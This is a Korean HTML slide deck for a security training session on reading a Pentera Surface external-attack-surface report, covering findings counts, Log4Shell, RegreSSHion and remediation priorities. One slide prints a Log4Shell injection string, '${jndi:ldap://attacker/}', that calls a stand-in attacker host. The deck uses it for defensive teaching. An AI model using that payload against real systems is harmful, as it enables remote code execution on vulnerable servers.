@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pentera Surface 리포트 읽기</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Noto Sans KR', sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    overflow: hidden;
+    height: 100vh;
+  }
+
+  .slide {
+    display: none;
+    width: 100vw;
+    height: 100vh;
+    padding: 60px 80px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .slide.active { display: flex; flex-direction: column; justify-content: center; }
+
+  .slide::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    right: -30%;
+    width: 800px;
+    height: 800px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(59, 130, 246, 0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .slide-title {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #0a0a0a 0%, #0f172a 100%);
+  }
+
+  .slide-title h1 {
+    font-size: 4.5rem;
+    font-weight: 900;
+    background: linear-gradient(135deg, #60a5fa, #22d3ee, #34d399);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 20px;
+    letter-spacing: -2px;
+  }
+
+  .slide-title .subtitle {
+    font-size: 1.6rem;
+    color: #9ca3af;
+    font-weight: 300;
+    margin-bottom: 50px;
+  }
+
+  .slide-title .meta {
+    font-size: 1rem;
+    color: #6b7280;
+  }
+
+  h2 {
+    font-size: 2.6rem;
+    font-weight: 700;
+    margin-bottom: 40px;
+    color: #f3f4f6;
+    position: relative;
+    padding-bottom: 15px;
+  }
+
+  h2::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 60px;
+    height: 4px;
+    background: linear-gradient(90deg, #60a5fa, #22d3ee);
+    border-radius: 2px;
+  }
+
+  h3 {
+    font-size: 1.5rem;
+    color: #7dd3fc;
+    margin-bottom: 15px;
+    font-weight: 500;
+  }
+
+  p, li {
+    font-size: 1.35rem;
+    line-height: 1.8;
+    color: #d1d5db;
+  }
+
+  ul { list-style: none; padding: 0; }
+
+  ul li {
+    padding: 10px 0 10px 35px;
+    position: relative;
+  }
+
+  ul li::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #60a5fa, #22d3ee);
+  }
+
+  .highlight { color: #7dd3fc; font-weight: 500; }
+  .danger { color: #f87171; font-weight: 500; }
+  .warn { color: #fbbf24; font-weight: 500; }
+  .safe { color: #86efac; font-weight: 500; }
+  .em-gradient {
+    background: linear-gradient(135deg, #60a5fa, #22d3ee);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .quote-box {
+    background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(34, 211, 238, 0.05));
+    border-left: 4px solid #60a5fa;
+    padding: 30px 35px;
+    border-radius: 0 12px 12px 0;
+    margin: 20px 0;
+    font-size: 1.4rem;
+    font-style: italic;
+    color: #bae6fd;
+  }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 50px;
+  }
+
+  .col { display: flex; flex-direction: column; justify-content: center; }
+
+  .tag {
+    display: inline-block;
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-size: 0.95rem;
+    font-weight: 500;
+    margin: 5px 8px 5px 0;
+  }
+
+  .tag-blue { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+  .tag-cyan { background: rgba(34, 211, 238, 0.15); color: #67e8f9; border: 1px solid rgba(34, 211, 238, 0.3); }
+  .tag-red { background: rgba(248, 113, 113, 0.15); color: #fca5a5; border: 1px solid rgba(248, 113, 113, 0.3); }
+  .tag-yellow { background: rgba(251, 191, 36, 0.15); color: #fcd34d; border: 1px solid rgba(251, 191, 36, 0.3); }
+  .tag-purple { background: rgba(168, 85, 247, 0.15); color: #d8b4fe; border: 1px solid rgba(168, 85, 247, 0.3); }
+
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 25px;
+    margin-top: 10px;
+  }
+
+  .card-grid.cols-2 { grid-template-columns: repeat(2, 1fr); }
+
+  .card {
+    background: linear-gradient(135deg, rgba(15, 30, 50, 0.8), rgba(10, 20, 40, 0.6));
+    border: 1px solid #1e3a5f;
+    border-radius: 16px;
+    padding: 28px;
+  }
+
+  .card-num {
+    display: inline-block;
+    width: 36px;
+    height: 36px;
+    line-height: 36px;
+    text-align: center;
+    border-radius: 10px;
+    background: linear-gradient(135deg, #60a5fa, #22d3ee);
+    color: #0a0a0a;
+    font-weight: 700;
+    margin-bottom: 14px;
+    font-size: 1.05rem;
+  }
+
+  .card h3 { font-size: 1.2rem; margin-bottom: 10px; }
+  .card p { font-size: 1rem; color: #9ca3af; line-height: 1.6; }
+
+  .danger-box {
+    background: rgba(248, 113, 113, 0.08);
+    border-left: 4px solid #f87171;
+    padding: 25px 30px;
+    border-radius: 0 12px 12px 0;
+    margin: 15px 0;
+  }
+
+  .warn-box {
+    background: rgba(251, 191, 36, 0.08);
+    border-left: 4px solid #fbbf24;
+    padding: 25px 30px;
+    border-radius: 0 12px 12px 0;
+    margin: 15px 0;
+  }
+
+  .safe-box {
+    background: rgba(52, 211, 153, 0.08);
+    border-left: 4px solid #34d399;
+    padding: 25px 30px;
+    border-radius: 0 12px 12px 0;
+    margin: 15px 0;
+  }
+
+  .stat-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 30px;
+    margin-top: 20px;
+  }
+
+  .stat {
+    text-align: center;
+    padding: 30px 20px;
+    background: linear-gradient(135deg, rgba(15, 30, 50, 0.8), rgba(10, 20, 40, 0.6));
+    border: 1px solid #1e3a5f;
+    border-radius: 16px;
+  }
+
+  .stat-num {
+    font-size: 4rem;
+    font-weight: 900;
+    background: linear-gradient(135deg, #60a5fa, #22d3ee, #34d399);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    line-height: 1;
+  }
+
+  .stat-label {
+    font-size: 1rem;
+    color: #9ca3af;
+    margin-top: 12px;
+  }
+
+  table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 1.05rem; }
+  th { text-align: left; padding: 12px 18px; background: rgba(59, 130, 246, 0.12); color: #93c5fd; font-weight: 500; border-bottom: 2px solid #1e3a5f; }
+  td { padding: 12px 18px; border-bottom: 1px solid #1e3a5f; color: #d1d5db; }
+  td.center { text-align: center; }
+
+  .badge {
+    display: inline-block;
+    padding: 4px 12px;
+    border-radius: 6px;
+    font-size: 0.85rem;
+    font-weight: 600;
+  }
+  .badge-extreme { background: #b91c1c; color: #fee2e2; }
+  .badge-serious { background: #ea580c; color: #ffedd5; }
+  .badge-moderate { background: #ca8a04; color: #fef3c7; }
+  .badge-minimal { background: #2563eb; color: #dbeafe; }
+  .badge-found { background: rgba(248, 113, 113, 0.2); color: #fca5a5; border: 1px solid rgba(248, 113, 113, 0.4); }
+  .badge-not-found { background: rgba(52, 211, 153, 0.15); color: #86efac; border: 1px solid rgba(52, 211, 153, 0.4); }
+
+  .one-word {
+    font-size: 7rem;
+    font-weight: 900;
+    text-align: center;
+    background: linear-gradient(135deg, #60a5fa, #22d3ee, #34d399);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: -4px;
+    line-height: 1;
+  }
+
+  .big-question {
+    font-size: 3.2rem;
+    font-weight: 700;
+    text-align: center;
+    line-height: 1.3;
+    color: #f3f4f6;
+  }
+
+  .timeline {
+    display: grid;
+    grid-template-columns: auto 1fr;
+    gap: 18px 24px;
+    margin: 20px 0;
+    font-size: 1.15rem;
+  }
+  .timeline .year { color: #7dd3fc; font-weight: 600; font-family: 'Fira Code', monospace; }
+  .timeline .event { color: #d1d5db; }
+
+  .nav { position: fixed; bottom: 30px; right: 40px; display: flex; gap: 12px; z-index: 100; }
+  .nav button {
+    background: rgba(59, 130, 246, 0.2);
+    border: 1px solid rgba(59, 130, 246, 0.4);
+    color: #93c5fd;
+    padding: 10px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1rem;
+    font-family: 'Noto Sans KR', sans-serif;
+    transition: all 0.2s;
+  }
+  .nav button:hover { background: rgba(59, 130, 246, 0.4); }
+
+  .slide-counter { position: fixed; bottom: 35px; left: 40px; color: #4b5563; font-size: 0.95rem; z-index: 100; }
+  .progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #60a5fa, #22d3ee, #34d399); transition: width 0.3s; z-index: 100; }
+
+  code {
+    color: #7dd3fc;
+    font-family: 'Fira Code', monospace;
+    font-size: 0.95rem;
+    background: rgba(15, 30, 50, 0.6);
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+
+  .end-slide h2 { font-size: 3rem; text-align: center; }
+  .end-slide h2::after { left: 50%; transform: translateX(-50%); }
+</style>
+</head>
+<body>
+
+<div class="progress" id="progress"></div>
+
+<!-- Slide 1: Title -->
+<div class="slide slide-title active" id="slide-1">
+  <h1>Pentera Surface<br>리포트 읽기</h1>
+  <p class="subtitle">External Attack Surface · 실제 사례 따라 읽기</p>
+  <div style="display:flex; gap:12px; justify-content:center; margin-bottom: 40px;">
+    <span class="tag tag-blue">Week 03</span>
+    <span class="tag tag-cyan">Pentera Surface</span>
+    <span class="tag tag-red">EASM</span>
+  </div>
+  <p class="meta">2026.05.18</p>
+</div>
+
+<!-- Slide 2: Recap -->
+<div class="slide" id="slide-2">
+  <h2>지난 시간까지</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="quote-box" style="font-size: 1.2rem;">
+        <span class="highlight">Week 01</span> — 침투 테스트의 기초<br>
+        <span class="highlight">Week 02-1</span> — Pentera Core 설정/시나리오<br>
+        <span class="highlight">Week 02-2</span> — Core 실행 모듈 / Safety
+      </div>
+      <ul style="margin-top: 20px; font-size: 1.15rem;">
+        <li>지금까지는 <span class="highlight">내부 침투 검증</span> 위주</li>
+        <li>오늘은 시선을 <span class="em-gradient">밖으로</span> 돌려본다</li>
+      </ul>
+    </div>
+    <div class="col">
+      <div class="big-question" style="font-size: 2.2rem; text-align: left;">
+        공격자는 <span class="em-gradient">우리 도메인 하나만 가지고</span><br>
+        어디까지 알아낼 수 있을까?
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 3: Surface vs Core -->
+<div class="slide" id="slide-3">
+  <h2>Surface vs Core</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card" style="padding: 35px;">
+        <h3 style="font-size: 1.6rem; color: #93c5fd;">Pentera Core</h3>
+        <p style="font-size: 1.1rem; margin-top: 12px;">네트워크 <span class="highlight">내부</span>에서 침투 검증</p>
+        <ul style="margin-top: 14px;">
+          <li style="font-size: 1.05rem;">Black/Gray/Targeted 시나리오</li>
+          <li style="font-size: 1.05rem;">AD 권한 상승, 측면 이동</li>
+          <li style="font-size: 1.05rem;">랜섬웨어 에뮬레이션</li>
+        </ul>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card" style="padding: 35px; border-color: #22d3ee;">
+        <h3 style="font-size: 1.6rem; color: #67e8f9;">Pentera Surface</h3>
+        <p style="font-size: 1.1rem; margin-top: 12px;"><span class="em-gradient">외부</span> 공격면 자동 발견·평가</p>
+        <ul style="margin-top: 14px;">
+          <li style="font-size: 1.05rem;">도메인 하나로 자산 그래프 확장</li>
+          <li style="font-size: 1.05rem;">CVE 자동 매칭</li>
+          <li style="font-size: 1.05rem;">EASM 카테고리</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="quote-box" style="margin-top: 30px; font-size: 1.2rem;">
+    오늘은 <span class="highlight">Surface 리포트 한 장</span>을 펼쳐서<br>
+    공격자 시선으로 한 줄씩 읽어본다.
+  </div>
+</div>
+
+<!-- Slide 4: The Big Number -->
+<div class="slide" id="slide-4">
+  <h2>도메인 1개 → 자산 370개</h2>
+  <div class="stat-grid">
+    <div class="stat"><div class="stat-num">113</div><div class="stat-label">Subdomains</div></div>
+    <div class="stat"><div class="stat-num">42</div><div class="stat-label">IP Addresses</div></div>
+    <div class="stat"><div class="stat-num">119</div><div class="stat-label">Websites</div></div>
+  </div>
+  <div class="warn-box" style="margin-top: 30px;">
+    <p style="font-size: 1.15rem; color:#fcd34d;">
+      시드로 입력한 건 <b>도메인 단 1개</b>. Pentera는 자동으로 113개 서브도메인·119개 웹사이트를 발견.<br>
+      <span style="color:#9ca3af; font-size: 1rem;">공격자도 같은 일을 한다 — <code>subfinder</code>, <code>amass</code>로 몇 분 안에.</span>
+    </p>
+  </div>
+</div>
+
+<!-- Slide 5: Three concepts -->
+<div class="slide" id="slide-5">
+  <h2>세 가지 개념을 구분하자</h2>
+  <div class="card-grid">
+    <div class="card">
+      <span class="card-num">A</span>
+      <h3 style="color:#fcd34d;">Attraction</h3>
+      <p>공격자에게 <b>매력적으로 보이는</b> 표면. 실제 취약 여부는 미확정.</p>
+      <p style="margin-top: 10px; font-style: italic; color:#9ca3af;">예: 만료된 SSL, 노출된 SSH 포트</p>
+    </div>
+    <div class="card">
+      <span class="card-num">V</span>
+      <h3 style="color:#fca5a5;">Vulnerability</h3>
+      <p><b>실제로 확인된</b> 보안 약점. CVE 매핑 가능.</p>
+      <p style="margin-top: 10px; font-style: italic; color:#9ca3af;">예: RegreSSHion CVE-2024-6387</p>
+    </div>
+    <div class="card">
+      <span class="card-num">A</span>
+      <h3 style="color:#86efac;">Achievement</h3>
+      <p>Pentera가 <b>실제로 익스플로잇에 성공</b>한 결과.</p>
+      <p style="margin-top: 10px; font-style: italic; color:#9ca3af;">예: Open Redirect로 외부 리디렉트 성공</p>
+    </div>
+  </div>
+  <div class="quote-box" style="margin-top: 30px; text-align: center; font-size: 1.4rem;">
+    Attraction ⊇ Vulnerability ⊇ Achievement
+  </div>
+</div>
+
+<!-- Slide 6: Impacting Findings -->
+<div class="slide" id="slide-6">
+  <h2>Impacting Findings</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>카테고리</th>
+        <th class="center">총 개수</th>
+        <th class="center">Extreme/Critical</th>
+        <th class="center">Serious/High</th>
+        <th class="center">Moderate/Medium</th>
+        <th class="center">Minimal/Low</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><b>Attractions</b></td>
+        <td class="center">326</td>
+        <td class="center"><span class="badge badge-extreme">1</span></td>
+        <td class="center"><span class="badge badge-serious">61</span></td>
+        <td class="center"><span class="badge badge-moderate">255</span></td>
+        <td class="center"><span class="badge badge-minimal">9</span></td>
+      </tr>
+      <tr>
+        <td><b>Vulnerabilities</b></td>
+        <td class="center">83</td>
+        <td class="center"><span class="badge badge-extreme">6</span></td>
+        <td class="center"><span class="badge badge-serious">36</span></td>
+        <td class="center"><span class="badge badge-moderate">27</span></td>
+        <td class="center"><span class="badge badge-minimal">14</span></td>
+      </tr>
+      <tr>
+        <td><b>Achievements</b></td>
+        <td class="center">96</td>
+        <td class="center"><span class="badge badge-extreme">5</span></td>
+        <td class="center"><span class="badge badge-serious">5</span></td>
+        <td class="center"><span class="badge badge-moderate">7</span></td>
+        <td class="center"><span class="badge badge-minimal">79</span></td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="quote-box" style="margin-top: 25px;">
+    326개 매력적 표면 중 단 1개가 <span class="danger">Extreme</span>.<br>
+    <span class="highlight">그 1개가 무엇인지</span>가 가장 먼저 봐야 할 질문이다.
+  </div>
+</div>
+
+<!-- Slide 7: Top Actions -->
+<div class="slide" id="slide-7">
+  <h2>Top Actions — Found vs Not Found</h2>
+  <table>
+    <thead>
+      <tr><th>Risk</th><th>Action</th><th class="center">Status</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><span class="badge badge-extreme">Critical</span></td><td>Log4Shell (CVE-2021-44228)</td><td class="center"><span class="badge badge-not-found">Not found</span></td></tr>
+      <tr><td><span class="badge badge-extreme">Critical</span></td><td>ASP.NET Insecure Deserialization</td><td class="center"><span class="badge badge-not-found">Not found</span></td></tr>
+      <tr><td><span class="badge badge-extreme">Critical</span></td><td>F5 BIG-IP RCE (CVE-2022-1388)</td><td class="center"><span class="badge badge-not-found">Not found</span></td></tr>
+      <tr><td><span class="badge badge-serious">High</span></td><td>Exploited Open Redirect</td><td class="center"><span class="badge badge-found">Found</span></td></tr>
+      <tr><td><span class="badge badge-serious">High</span></td><td>Remote MySQL connection enabled</td><td class="center"><span class="badge badge-found">Found</span></td></tr>
+      <tr><td><span class="badge badge-moderate">Medium</span></td><td>Reflected XSS</td><td class="center"><span class="badge badge-found">Found</span></td></tr>
+      <tr><td><span class="badge badge-moderate">Medium</span></td><td>Detect DB Servers</td><td class="center"><span class="badge badge-found">Found</span></td></tr>
+    </tbody>
+  </table>
+  <div class="quote-box" style="margin-top: 20px; font-size: 1.2rem;">
+    단 1개라도 <span class="danger">Found</span>이면 우선순위 큐의 맨 앞이다.<br>
+    <span style="color:#9ca3af; font-size: 1rem;">"많이 안 뚫리고 1개만 뚫렸다"는 안심이 아닌 행동의 신호.</span>
+  </div>
+</div>
+
+<!-- Slide 8: Hook 1 -->
+<div class="slide" id="slide-8">
+  <h2>🔴 흥미로운 발견 ① — Potential Log4Shell</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="danger-box">
+        <p style="font-size: 1.1rem;"><b>Extreme</b> 등급 — 326개 중 단 1건</p>
+        <ul style="margin-top: 12px;">
+          <li style="font-size: 1.05rem;">CVE: <code>CVE-2021-44228</code></li>
+          <li style="font-size: 1.05rem;">자산: <code>xxx.xxx.xxx.xx:9003</code></li>
+          <li style="font-size: 1.05rem;">상태: 자동 익스플로잇 실패, <span class="warn">Log4j 사용 흔적 검출</span></li>
+        </ul>
+      </div>
+    </div>
+    <div class="col">
+      <div class="warn-box">
+        <p style="font-size: 1.1rem; color: #fcd34d;"><b>Top Actions에서는 "Not Found"인데?</b></p>
+        <p style="font-size: 1rem; margin-top: 12px; color:#d1d5db;">
+          Pentera의 자동 익스플로잇 PoC는 실패했지만, 트래픽 패턴이나 응답 헤더에서 <b>Log4j 의심 신호</b>가 잡혔다는 뜻.
+        </p>
+        <p style="font-size: 1.05rem; margin-top: 14px; color: #fcd34d;">→ <b>수동 검증 1순위</b></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 9: Why Log4Shell still matters -->
+<div class="slide" id="slide-9">
+  <h2>4년 지난 CVE가 아직도 1순위인 이유</h2>
+  <div class="two-col">
+    <div class="col">
+      <table style="font-size: 1.1rem;">
+        <tbody>
+          <tr><td>공개</td><td><code>2021-12-09</code></td></tr>
+          <tr><td>CVSS</td><td><span class="danger"><b>10.0</b></span> (Maximum)</td></tr>
+          <tr><td>익스플로잇</td><td>매우 낮음</td></tr>
+          <tr><td>Active in Wild</td><td><span class="danger">YES</span></td></tr>
+          <tr><td>CISA KEV</td><td><span class="danger">등재</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="col">
+      <div class="danger-box">
+        <p style="font-size: 1.15rem; color:#fca5a5;"><b>익스플로잇 한 줄:</b></p>
+        <p style="font-family: 'Fira Code', monospace; font-size: 1.2rem; margin-top: 10px; color:#fca5a5;">
+          ${jndi:ldap://attacker/}
+        </p>
+      </div>
+      <div class="quote-box" style="margin-top: 18px; font-size: 1.15rem;">
+        "옛날 CVE라 다 패치되었을 것"이라는 가정은 위험.<br>
+        <span class="highlight">자동화 봇이 24시간 스캔 중.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 10: Hook 2 -->
+<div class="slide" id="slide-10">
+  <h2>🟡 흥미로운 발견 ② — RegreSSHion</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="warn-box">
+        <p style="font-size: 1.15rem;"><b>CVE-2024-6387</b> · 점수 8.1 (High)</p>
+        <ul style="margin-top: 14px;">
+          <li style="font-size: 1.05rem;">자산: <code>xxx.xxx.xxx.xx:22</code></li>
+          <li style="font-size: 1.05rem;">영향: OpenSSH 8.5p1 ~ 9.8p1</li>
+          <li style="font-size: 1.05rem;">결과: <span class="danger">인증 없는 RCE (root)</span></li>
+        </ul>
+      </div>
+    </div>
+    <div class="col">
+      <h3 style="font-size: 1.5rem; color: #fcd34d;">왜 "Regression"?</h3>
+      <p style="font-size: 1.2rem; margin-top: 12px;">
+        2006년에 패치된 OpenSSH 결함이<br>
+        <span class="danger">2020년 리팩토링에서 부활</span>했기 때문.
+      </p>
+      <p style="font-size: 1.15rem; margin-top: 18px; color:#9ca3af;">
+        보안 픽스도 회귀(regression)할 수 있다는 사례.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 11: Regression timeline -->
+<div class="slide" id="slide-11">
+  <h2>회귀 CVE의 18년 여정</h2>
+  <div class="timeline" style="max-width: 800px; margin: 0 auto;">
+    <div class="year">2006</div><div class="event">CVE-2006-5051 발견 및 패치</div>
+    <div class="year">↓</div><div class="event" style="color:#6b7280;">(시간 흐름, 코드 리팩토링)</div>
+    <div class="year">2020</div><div class="event"><span class="warn">리팩토링 과정에서 동일 결함 재도입</span></div>
+    <div class="year">↓</div><div class="event" style="color:#6b7280;">(4년간 미발견)</div>
+    <div class="year">2024</div><div class="event"><span class="danger">CVE-2024-6387 (RegreSSHion) 재발견</span></div>
+  </div>
+  <div class="quote-box" style="margin-top: 35px; text-align: center;">
+    "한 번 고친 CVE는 영원히 고쳐진다"는 가정도 깨진다.<br>
+    <span class="highlight">CI/CD에 보안 회귀 테스트가 필요한 이유.</span>
+  </div>
+</div>
+
+<!-- Slide 12: Past Findings -->
+<div class="slide" id="slide-12">
+  <h2>Past Findings — 조치의 증거</h2>
+  <table>
+    <thead>
+      <tr><th>점수</th><th>과거 발견 항목</th><th>현재 상태</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><span class="badge badge-extreme">9.8</span></td><td>PrestaShop SQL Injection</td><td><span class="safe">해결됨</span></td></tr>
+      <tr><td><span class="badge badge-serious">8.3</span></td><td>API secrets exposed</td><td><span class="safe">해결됨</span></td></tr>
+      <tr><td><span class="badge badge-moderate">5.3</span></td><td>Remote MySQL connection enabled</td><td><span class="warn">일부 해결, 타 자산 영향</span></td></tr>
+      <tr><td><span class="badge badge-moderate">4.5</span></td><td>Database exposed to the internet</td><td><span class="warn">일부 해결, 타 자산 영향</span></td></tr>
+      <tr><td><span class="badge badge-minimal">1.9</span></td><td>Enumerated Git repository</td><td><span class="safe">해결됨</span></td></tr>
+    </tbody>
+  </table>
+  <div class="warn-box" style="margin-top: 25px;">
+    <p style="font-size: 1.1rem; color:#fcd34d;">
+      <b>"Note this vulnerability type is still affecting other assets"</b><br>
+      <span style="color:#d1d5db; font-size: 1rem;">한 자산은 고쳤지만 같은 유형이 다른 자산에 남아있다는 경고. 전형적 <b>패치 누락</b>.</span>
+    </p>
+  </div>
+</div>
+
+<!-- Slide 13: 1-3-5 priority -->
+<div class="slide" id="slide-13">
+  <h2>1-3-5 우선순위 원칙</h2>
+  <div class="card-grid">
+    <div class="card">
+      <span class="card-num">1주</span>
+      <h3 style="color:#fca5a5;">1건의 Extreme</h3>
+      <p>Potential Log4Shell 수동 검증. 진짜면 격리 → 패치 → 재검사.</p>
+    </div>
+    <div class="card">
+      <span class="card-num">1개월</span>
+      <h3 style="color:#fcd34d;">3건의 High</h3>
+      <p>신규 CVE (RegreSSHion), 외부 노출 DB, 외부 노출 SSH.</p>
+    </div>
+    <div class="card">
+      <span class="card-num">분기</span>
+      <h3 style="color:#86efac;">5건의 위생</h3>
+      <p>만료 인증서, 약한 cipher, 서브도메인 인벤토리, 포트 정책, 자산 owner 매핑.</p>
+    </div>
+  </div>
+  <div class="quote-box" style="margin-top: 30px; text-align: center;">
+    모든 취약점을 한꺼번에 잡으려는 것이 <span class="danger">가장 흔한 실패 패턴</span>.<br>
+    <span class="highlight">Extreme 1건을 끝까지 추적하는 것</span>이 326건을 동시에 훑는 것보다 가치 있다.
+  </div>
+</div>
+
+<!-- Slide 14: Common mistakes -->
+<div class="slide" id="slide-14">
+  <h2>흔한 실수</h2>
+  <ul style="font-size: 1.2rem;">
+    <li><span class="danger">"CVSS 9.8이 Past로 표시되면 안전"</span> ← Past는 "해당 자산에서 안 보임"일 뿐. 다른 자산에 같은 패턴 있을 수 있음.</li>
+    <li><span class="danger">"Attraction이 많아도 Vulnerability가 적으면 OK"</span> ← 326개 모두가 정찰의 출발점.</li>
+    <li><span class="danger">"외부에서 안 보이면 안전"</span> ← Surface는 외부만. 내부 침투는 Core로 별도 검증.</li>
+    <li><span class="danger">"4년 지난 CVE는 다 패치됨"</span> ← Log4Shell이 아직도 1건씩 잡힌다.</li>
+  </ul>
+</div>
+
+<!-- Slide 15: Summary -->
+<div class="slide end-slide" id="slide-15">
+  <h2>정리</h2>
+  <div style="max-width: 850px; margin: 0 auto;">
+    <ul style="margin-bottom: 30px; font-size: 1.2rem;">
+      <li>도메인 1개 → 자산 <span class="em-gradient"><b>370개</b></span> 자동 매핑</li>
+      <li><span class="highlight">Attraction / Vulnerability / Achievement</span> 는 모두 다른 개념</li>
+      <li>Extreme 1건이 Moderate 255건보다 우선</li>
+      <li>신규 CVE도, <span class="warn">회귀 CVE</span>도 모두 위협</li>
+      <li>Past Findings의 "타 자산에 여전히 영향" 경고를 놓치지 말 것</li>
+    </ul>
+    <div class="quote-box" style="text-align: center; font-size: 1.5rem;">
+      개수가 아니라 <span class="em-gradient">등급과 익스플로잇 가능성</span>으로 우선순위를 잡는다.
+    </div>
+  </div>
+</div>
+
+<!-- Slide 16: Q&A -->
+<div class="slide end-slide" id="slide-16">
+  <div style="text-align:center;">
+    <div style="font-size: 4rem; margin-bottom: 20px; background: linear-gradient(135deg, #60a5fa, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;">Q &amp; A</div>
+    <p style="color: #6b7280; font-size: 1.3rem;">감사합니다</p>
+  </div>
+</div>
+
+<div class="nav">
+  <button onclick="prevSlide()">&#8592; Prev</button>
+  <button onclick="nextSlide()">Next &#8594;</button>
+</div>
+<div class="slide-counter" id="counter">1 / 16</div>
+
+<script>
+  let current = 1;
+  const total = 16;
+
+  function showSlide(n) {
+    document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
+    document.getElementById(`slide-${n}`).classList.add('active');
+    document.getElementById('counter').textContent = `${n} / ${total}`;
+    document.getElementById('progress').style.width = `${(n / total) * 100}%`;
+  }
+
+  function nextSlide() { if (current < total) { current++; showSlide(current); } }
+  function prevSlide() { if (current > 1) { current--; showSlide(current); } }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'Enter') { e.preventDefault(); nextSlide(); }
+    if (e.key === 'ArrowLeft' || e.key === 'Backspace') { e.preventDefault(); prevSlide(); }
+  });
+
+  let touchStartX = 0;
+  document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX);
+  document.addEventListener('touchend', e => {
+    const diff = touchStartX - e.changedTouches[0].clientX;
+    if (diff > 50) nextSlide();
+    if (diff < -50) prevSlide();
+  });
+</script>
+
+</body>
+</html>
